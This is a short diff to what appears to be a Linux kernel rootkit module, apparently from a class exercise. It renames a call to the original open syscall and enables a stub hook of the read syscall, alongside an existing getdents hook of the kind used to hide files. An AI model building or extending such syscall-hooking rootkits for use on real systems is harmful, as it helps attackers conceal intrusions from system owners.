@@ -74,7 +74,7 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  return original_open(pathname, flags);
 }
 
 
@@ -117,11 +117,10 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
 
 
 //Define our new sneaky_version of the 'read' syscall
-/*asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
+asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
 
   return 0;
 }
-*/
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
